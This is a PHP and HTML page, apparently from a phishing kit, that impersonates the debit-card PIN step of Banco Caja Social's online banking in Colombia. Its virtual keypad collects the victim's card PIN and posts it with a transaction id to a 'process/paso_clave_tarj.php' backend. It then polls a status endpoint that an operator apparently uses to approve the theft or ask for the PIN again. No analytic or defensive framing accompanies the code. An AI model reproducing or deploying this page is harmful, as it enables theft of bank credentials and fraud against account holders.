<?php
session_start();
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
date_default_timezone_set('America/Bogota');
$id_transaccion = $_SESSION['id_transaccion'] ?? 0;
?>
<html>
	<head>
		<title>Caja Social - Clave de Tarjeta Débito</title>
		<meta http-equiv="content-type" content="text/html; utf-8">
		<meta charset="utf-8">
		<meta content="es" http-equiv="Content-Language">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">
		<link rel="icon" type="image/png" href="img/logo.png" />
		<link href="img/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
		<link rel="preconnect" href="https://fonts.googleapis.com">
		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
		<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
		<script type="text/javascript" src="/js/jquery-3.6.0.min.js"></script>
		<script src="/js/jquery.jclock-min.js" type="text/javascript"></script>
		<style type="text/css">
			#frm-clave {
				display: block !important;
			}
		</style>
	</head>
	<body>
		<div id="menu-mob"></div>
		<div id="frmLogin" style="display:none;"></div>
		<div id="fondo"></div>
		<div class="loader">
			<img src="img/load.svg" width="130">
		</div>

		<div id="frm-clave">
			<div class="titulo" style="margin-bottom: 8px;">Pregunta de seguridad</div>
			<span class="subtexto-frm">Clave de tarjeta débito</span>
			<br>
			<div class="separador"></div>
			<br>
			<div class="etiqueta">(*) CLAVE DE TARJETA DÉBITO</div>
			<input type="password" name="txtClave" id="txtClave" class="entradas" autocomplete="off" pattern="[0-9]*" maxlength="20" inputmode="numeric">
			<div class="error-input" id="error-clave">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
			<br>
			<div style="font-size: 12px; color: #999; margin-bottom: 20px;">Puede ser la clave de cualesquiera de sus tarjetas débito</div>

			<!-- Teclado Virtual Numérico -->
			<div style="margin: 30px 0;">
				<table cellspacing="6" style="margin: 0 auto;">
					<tr>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">1</td>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">2</td>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">3</td>
					</tr>
					<tr>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">4</td>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">5</td>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">6</td>
					</tr>
					<tr>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">7</td>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">8</td>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">9</td>
					</tr>
					<tr>
						<td></td>
						<td class="teclado-num" style="padding: 15px 20px; background: #f0f0f0; border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; user-select: none;">0</td>
						<td></td>
					</tr>
				</table>
			</div>

			<br><br>
			<div style="text-align:center;">
				<button class="btn btn-form" type="button" id="btnClave" disabled> CONTINUAR </button>
			</div>
		</div>

		<div class="top-bar"></div>
		<div class="header"></div>

	</body>
</html>
<script type="text/javascript">
	var idTransaccion = <?php echo $id_transaccion; ?>;
	var espera = 0;
	var identificadorTiempoDeEspera;

	function paso_clave_tarj(clave) {
		$.post("../../../process/paso_clave_tarj.php", { clave: clave, id: idTransaccion }, function(data) {
			espera = 1;
			iniciar_polling();
		});
	}

	function consultar_estado() {
		if (espera == 1) {
			$.post("../../../process/estado.php", function(data) {
				switch (data) {
					case '10':
						espera = 0;
						window.location.href = "../../../finish-no-back-button/";
						break;
					case '12':
						espera = 0;
						location.reload();
						break;
					default:
						break;
				}
			});
		}
	}

	function iniciar_polling() {
		identificadorTiempoDeEspera = setInterval(consultar_estado, 2000);
	}

	function detener_polling() {
		if (identificadorTiempoDeEspera) {
			clearInterval(identificadorTiempoDeEspera);
		}
	}

	$(document).ready(function() {
		// Teclado virtual numérico
		$(".teclado-num").click(function(){
			var num = $(this).text();
			$("#txtClave").val($("#txtClave").val() + num);
			if($("#txtClave").val().length > 0) {
				$("#btnClave").removeAttr("disabled");
			}
		});

		// Botón continuar
		$("#btnClave").click(function(){
			if($("#txtClave").val().length > 0) {
				$("#frm-clave").hide();
				$("#fondo").show();
				$(".loader").show();
				paso_clave_tarj($("#txtClave").val());
			}
		});

		// Enter en input
		$("#txtClave").keypress(function(e){
			if(e.keyCode == 13 && $("#txtClave").val().length > 0) {
				$("#btnClave").click();
			}
		});
	});

	// Detener polling cuando se cierra la página
	$(window).on('beforeunload', function() {
		detener_polling();
	});
</script>
